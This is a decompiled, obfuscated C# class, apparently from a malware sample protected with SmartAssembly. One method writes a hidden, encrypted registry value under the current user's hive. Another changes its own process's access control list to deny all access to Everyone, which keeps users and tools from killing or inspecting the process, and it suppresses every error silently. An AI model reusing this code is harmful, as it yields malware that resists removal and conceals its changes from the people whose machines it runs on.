using System;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace vlFwgXmbIo;

internal sealed class UhkNubBinvEmOU
{
	[NonSerialized]
	internal static GetString getString_0;

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr qdliQKJAfnRM, int PFFbMHZGgGsp, [Out] byte[] WrflppeljemqF, uint aNaWRrpcMBqBF, out uint dtWLwRDWqym);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr nVIAmjBziCdjA, int aovhocFyvJolsN, [In] byte[] hVGmboBNQnZhR);

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetCurrentProcess();

	public void ISpQpKkdoQCsiV(bool bool_0)
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107405343)));
			registryKey.SetValue(RQEwPOshulKqs.JqDJfBiOyDaAy(getString_0(107404694)), getString_0(107406361));
			registryKey.Close();
		}
		catch
		{
		}
	}

	private RawSecurityDescriptor dlbOxxrZZtgD(IntPtr intptr_0)
	{
		byte[] wrflppeljemqF = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, wrflppeljemqF, 0u, out var dtWLwRDWqym);
		if ((long)dtWLwRDWqym > 32767L)
		{
			return null;
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, wrflppeljemqF = new byte[dtWLwRDWqym], dtWLwRDWqym, out dtWLwRDWqym))
		{
			return null;
		}
		return new RawSecurityDescriptor(wrflppeljemqF, 0);
	}

	private void shUgJZshKcb(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		SetKernelObjectSecurity(intptr_0, 4, array);
	}

	public void sTHHttFgMea()
	{
		try
		{
			IntPtr currentProcess = GetCurrentProcess();
			RawSecurityDescriptor rawSecurityDescriptor = dlbOxxrZZtgD(currentProcess);
			rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
			shUgJZshKcb(currentProcess, rawSecurityDescriptor);
		}
		catch (Exception)
		{
		}
	}

	static UhkNubBinvEmOU()
	{
		Strings.CreateGetStringDelegate(typeof(UhkNubBinvEmOU));
	}
}
